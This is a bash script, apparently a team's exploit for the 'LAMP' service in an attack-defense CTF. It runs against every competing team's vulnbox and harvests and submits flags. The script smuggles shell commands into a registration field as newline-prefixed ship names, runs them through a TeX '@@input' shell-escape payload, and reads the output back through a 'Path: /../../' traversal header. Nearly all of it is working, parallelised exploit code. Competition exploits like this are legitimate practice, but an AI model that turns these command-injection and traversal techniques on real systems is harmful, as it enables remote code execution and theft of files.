#!/usr/bin/env bash
set -u -o pipefail

# FAUST CTF 2026 - LAMP multi-team harvester
# Scope: authorized FAUST CTF competition vulnboxes only, TCP/1337.
#
# XeLaTeX is a web server now. This is a sentence I wish I had never needed
# to type, yet here we are.

TEAMS_URL="${TEAMS_URL:-https://2026.faustctf.net/competition/teams.json}"
PORT="${PORT:-1337}"
OWN_TEAM="${OWN_TEAM:-}"
WORKERS="${WORKERS:-8}"
CANDIDATES="${CANDIDATES:-30}"
CONNECT_TIMEOUT="${CONNECT_TIMEOUT:-2}"
MAX_TIME="${MAX_TIME:-6}"
MOTH_URL="${MOTH_URL:-http://127.0.0.1:8001}"
MOTH_ENDPOINT="${MOTH_ENDPOINT:-/api/flags/batch}"
SUBMIT="${SUBMIT:-1}"
ONLY_TEAMS="${ONLY_TEAMS:-}"

if [[ -z "$OWN_TEAM" ]]; then
  echo "[-] Set OWN_TEAM first, e.g. OWN_TEAM=123 $0" >&2
  exit 2
fi

for cmd in curl jq grep sort head mktemp perl; do
  command -v "$cmd" >/dev/null 2>&1 || {
    echo "[-] missing dependency: $cmd" >&2
    exit 2
  }
done

# No tokens in git. Future-us deserves at least this one kindness.
if [[ "$SUBMIT" == "1" && -z "${MOTH_API_TOKEN:-}" ]]; then
  if [[ -r /etc/moth/moth.env ]]; then
    set -a
    # shellcheck disable=SC1091
    source /etc/moth/moth.env
    set +a
  fi
fi

if [[ "$SUBMIT" == "1" && -z "${MOTH_API_TOKEN:-}" ]]; then
  read -rsp 'MOTH API token: ' MOTH_API_TOKEN
  echo
  export MOTH_API_TOKEN
fi

RUN_DIR="$(mktemp -d /tmp/lamp-brrr.XXXXXX)"
trap 'echo "[*] run data kept in $RUN_DIR"' EXIT

urlencode() {
  jq -nr --arg v "$1" '$v|@uri'
}

target_url() {
  printf 'http://[fd66:666:%s::2]:%s' "$1" "$PORT"
}

register_carrier() {
  local team="$1" shellcmd="$2" skip="${3:-}"
  local base pool start i idx u jar body ship enc
  base="$(target_url "$team")"
  pool='0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
  start=$(( team % ${#pool} ))

  # Ship names were supposed to be decorative. We gave them a second career
  # as newline-prefixed shell command carriers. Very normal application design.
  ship=$'\n'"$shellcmd"
  enc="$(urlencode "$ship")"

  for ((i=0; i<${#pool}; i++)); do
    idx=$(( (start + i) % ${#pool} ))
    u="${pool:idx:1}"
    [[ "$u" == "$skip" ]] && continue
    jar="$RUN_DIR/team-${team}-${u}.jar"
    rm -f "$jar"

    body="$(curl -g -6 --noproxy '*' -sS \
      --connect-timeout "$CONNECT_TIMEOUT" --max-time "$MAX_TIME" \
      -c "$jar" -b "$jar" \
      --data-raw "username=$u&password=mof&shipname=$enc" \
      "$base/register" 2>/dev/null || true)"

    if grep -q 'Successfully registered account' <<<"$body"; then
      printf '%s\t%s\n' "$u" "$jar"
      return 0
    fi
  done
  return 1
}

trigger_carrier() {
  local team="$1" user="$2" jar="$3"
  local base body
  base="$(target_url "$team")"

  # Tiny payload, enormous emotional damage.
  # ^^5c -> backslash, @@input -> shell-enabled input primitive,
  # /s*/X* -> the shortest ugly route we had to the carrier file.
  body="action=add&x=10&y=10&typ=^^5cUseName{@@input}|\"sh%20/s*/${user}*\""
  curl -g -6 --noproxy '*' -sS \
    --connect-timeout "$CONNECT_TIMEOUT" --max-time "$MAX_TIME" \
    -b "$jar" --data-raw "$body" "$base/" >/dev/null 2>&1 || true
}

fetch_path() {
  local team="$1" path="$2" outfile="$3"
  local base attempt
  base="$(target_url "$team")"
  rm -f "$outfile"

  # The Path bug that opened the door also carries the loot back out.
  # Reusing primitives: environmentally responsible exploitation.
  for attempt in 1 2; do
    if curl -g -6 --noproxy '*' --path-as-is -sS \
      --connect-timeout "$CONNECT_TIMEOUT" --max-time "$MAX_TIME" \
      -H "Path: /../../${path#/}" "$base/" -o "$outfile" 2>/dev/null; then
      [[ -s "$outfile" ]] && return 0
    fi
    sleep 0.15
  done
  return 1
}

submit_flags() {
  local team="$1" flagfile="$2"
  local payload response http body
  [[ "$SUBMIT" == "1" ]] || return 0
  [[ -s "$flagfile" ]] || return 0

  payload="$RUN_DIR/team-${team}-moth.json"
  jq -Rs --arg source "lamp-brrr-team-${team}" '
    {flags:(split("\n")|map(select(length>0))), service:"LAMP", source:$source}
  ' "$flagfile" > "$payload"

  # Feed MOTH. MOTH judges silently.
  response="$(curl -sS --connect-timeout 2 --max-time 8 \
    -X POST "${MOTH_URL}${MOTH_ENDPOINT}" \
    -H "Authorization: Bearer $MOTH_API_TOKEN" \
    -H 'Content-Type: application/json' \
    --data-binary "@$payload" \
    -w $'\n%{http_code}' 2>/dev/null || true)"

  http="${response##*$'\n'}"
  body="${response%$'\n'*}"
  printf '[team %s] MOTH HTTP %s ' "$team" "$http"
  if jq -e . >/dev/null 2>&1 <<<"$body"; then
    jq -c '.summary // .' <<<"$body"
  else
    printf '%s\n' "${body:0:240}"
  fi
}

attack_team() {
  local team="$1" base listfile outfile stage1 stage2 c1 j1 c2 j2 raw flags n
  base="$(target_url "$team")"
  listfile="/m${team}a"
  outfile="/m${team}b"
  raw="$RUN_DIR/team-${team}.raw"
  flags="$RUN_DIR/team-${team}.flags"

  # Do not perform an exorcism on a service that is not even alive.
  if ! curl -g -6 --noproxy '*' -sS \
      --connect-timeout "$CONNECT_TIMEOUT" --max-time 3 \
      "$base/register" -o /dev/null 2>/dev/null; then
    printf '[team %s] offline/unreachable\n' "$team"
    return 0
  fi

  # Stage 1: ask for the newest checker-looking storage files.
  # Sixteen question marks: regex sophistication was cancelled due to TeX.
  stage1="rm -f $listfile;ls -1t /storage/????????????????.tex|head -$CANDIDATES>$listfile"
  if ! IFS=$'\t' read -r c1 j1 < <(register_carrier "$team" "$stage1"); then
    printf '[team %s] no free 1-char carrier (stage1)\n' "$team"
    return 0
  fi
  trigger_carrier "$team" "$c1" "$j1"

  # Stage 2: grep only that recent set. Less archaeology, more fresh flags.
  stage2="rm -f $outfile;cat $listfile|xargs grep -h FAUST>$outfile"
  if ! IFS=$'\t' read -r c2 j2 < <(register_carrier "$team" "$stage2" "$c1"); then
    printf '[team %s] no free 1-char carrier (stage2)\n' "$team"
    return 0
  fi
  trigger_carrier "$team" "$c2" "$j2"

  if ! fetch_path "$team" "$outfile" "$raw"; then
    printf '[team %s] exploited, no readable result\n' "$team"
    return 0
  fi

  # LAMP stored '_' as \Uchar95. Put the flag back together and remove duplicates.
  perl -pe 's/\\Uchar95\s*/_/g' "$raw" \
    | grep -aoE 'FAUST_[A-Za-z0-9+/]{32}' \
    | sort -u > "$flags" || true

  n="$(wc -l < "$flags" | tr -d ' ')"
  printf '[team %s] carriers=%s,%s flags=%s\n' "$team" "$c1" "$c2" "$n"

  if [[ "$n" -gt 0 ]]; then
    submit_flags "$team" "$flags"
  fi
}

export -f urlencode target_url register_carrier trigger_carrier fetch_path submit_flags attack_team
export RUN_DIR PORT CONNECT_TIMEOUT MAX_TIME CANDIDATES MOTH_URL MOTH_ENDPOINT SUBMIT MOTH_API_TOKEN

TEAMS_FILE="$RUN_DIR/teams.txt"
curl -fsS --max-time 10 "$TEAMS_URL" \
  | jq -r '.teams[]' \
  | awk -v own="$OWN_TEAM" '$1 != 1 && $1 != own' \
  > "$TEAMS_FILE"

if [[ -n "$ONLY_TEAMS" ]]; then
  tr ',' '\n' <<<"$ONLY_TEAMS" | sort -n > "$RUN_DIR/only.txt"
  grep -Fx -f "$RUN_DIR/only.txt" "$TEAMS_FILE" > "$RUN_DIR/filtered.txt" || true
  mv "$RUN_DIR/filtered.txt" "$TEAMS_FILE"
fi

TOTAL="$(wc -l < "$TEAMS_FILE" | tr -d ' ')"
echo "[*] targets=$TOTAL workers=$WORKERS candidates/team=$CANDIDATES submit=$SUBMIT"
echo "[*] skipping NOC team 1 and own team $OWN_TEAM"

# Different vulnboxes are independent. Be fast, not rude.
while IFS= read -r team; do
  attack_team "$team" &
  while (( $(jobs -rp | wc -l) >= WORKERS )); do
    wait -n || true
  done
done < "$TEAMS_FILE"
wait || true

cat "$RUN_DIR"/team-*.flags 2>/dev/null | sort -u > "$RUN_DIR/all.flags" || true
TOTAL_FLAGS="$(wc -l < "$RUN_DIR/all.flags" 2>/dev/null | tr -d ' ' || echo 0)"
echo "[*] unique harvested flags: $TOTAL_FLAGS"
echo "[*] flags: $RUN_DIR/all.flags"
